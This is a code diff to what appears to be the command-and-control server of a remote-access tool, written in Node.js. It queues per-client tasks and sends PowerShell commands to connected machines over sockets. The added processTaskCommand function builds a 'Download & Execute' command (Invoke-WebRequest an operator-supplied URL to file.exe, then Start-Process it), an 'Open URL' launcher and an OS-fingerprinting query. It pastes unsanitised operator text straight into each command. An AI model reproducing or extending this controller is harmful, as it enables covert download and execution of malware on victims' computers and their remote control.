@@ -36,8 +36,8 @@ app.get("/api/v1/tasks/:id", async (req, res) => {
 });
 
 app.post("/api/v1/tasks", async (req, res) => {
-  const { ip, task, status } = req.body;
-  await db.createTask(ip, task, status);
+  const { ip, task, additionalText, status } = req.body;
+  await db.createTask(ip, task, status, additionalText);
   res.status(201).json({ message: "Task added successfully" });
 });
 
@@ -92,12 +92,19 @@ app.post("/api/v1/sendCommand", async (req, res) => {
 
 async function sendPendingTasks(client) {
   const pendingTasks = await db.getPendingTasksForIP(client.address);
-  console.log("Sending pending tasks to client:", pendingTasks);
-  console.log("Client address:", client.address);
   for (const task of pendingTasks) {
     try {
-      const output = await sendCommandToClient(client, task);
+      const command = await processTaskCommand(task.task, task.parameter);
+      console.log("Sending command to client:", command);
+      const output = await sendCommandToClient(client, command);
       await db.updateTaskOutputById(output, "Completed", task.id);
+      broadcastTaskUpdate(
+        task.id,
+        client.address,
+        task.task,
+        "Completed",
+        output
+      );
     } catch (error) {
       console.error("Failed to send pending task:", error);
       await db.updateTaskStatusById("Failed", task.id);
@@ -105,6 +112,22 @@ async function sendPendingTasks(client) {
   }
 }
 
+async function processTaskCommand(task, additionalText) {
+  return new Promise((resolve, reject) => {
+    if (task === "Open URL") {
+      const command = `Start-Process ${additionalText}`;
+      resolve(command);
+    } else if (task === "Download & Execute") {
+      const command = `Invoke-WebRequest ${additionalText} -OutFile file.exe; Start-Process file.exe`;
+      resolve(command);
+    } else if (task === "Get OS info") {
+      const command = "Get-WmiObject Win32_OperatingSystem | Format-List *";
+      resolve(command);
+    } else {
+      reject("Unknown task command");
+    }
+  });
+}
 function sendCommandToClient(client, task) {
   return new Promise((resolve, reject) => {
     let response = "";
@@ -123,20 +146,13 @@ function sendCommandToClient(client, task) {
             console.log("Received output from client:", jsonResponse.message); // Log the received output
 
             // Update the database
-            await db.updateTaskOutputById(
-              jsonResponse.message,
-              "Completed",
-              task.id
-            );
+            // await db.updateTaskOutputById(
+            //   jsonResponse.message,
+            //   "Completed",
+            //   task.id
+            // );
 
             // Broadcast the updated task to all WebSocket clients
-            broadcastTaskUpdate(
-              task.id,
-              client.address,
-              task.task,
-              "Completed",
-              jsonResponse.message
-            );
 
             resolve(jsonResponse.message);
           }
@@ -151,7 +167,7 @@ function sendCommandToClient(client, task) {
       reject(err);
     });
 
-    client.socket.write(task.task + "\n", (err) => {
+    client.socket.write(task + "\n", (err) => {
       if (err) {
         reject(err);
       }
